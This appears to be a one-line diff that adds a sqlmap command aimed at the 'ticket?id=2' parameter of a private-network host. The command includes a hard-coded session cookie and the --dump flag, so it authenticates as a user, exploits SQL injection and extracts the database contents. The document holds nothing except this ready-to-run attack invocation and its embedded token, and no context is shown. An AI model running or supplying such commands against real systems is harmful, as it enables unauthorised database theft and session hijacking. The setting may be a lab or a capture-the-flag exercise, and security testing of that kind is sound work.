@@ -1,0 +1,1 @@
+sqlmap -u http://10.42.153.105/ticket?id=2 --cookie="session=.eJxFyksKgCAURuG9_GMJmzoqWkIrULyR4AuvUhDtPaGBw_NxHqw2uMhQh_ZMAlvjmgKVIXvLOZXaoZbWm4J2Hgr8-3KRkbeU02lqhICzULNAYypRBxoj3g8vsSW4.aWo1gQ.cvstVBRG3dRxLNcyxh71KBN4eWo" --dump
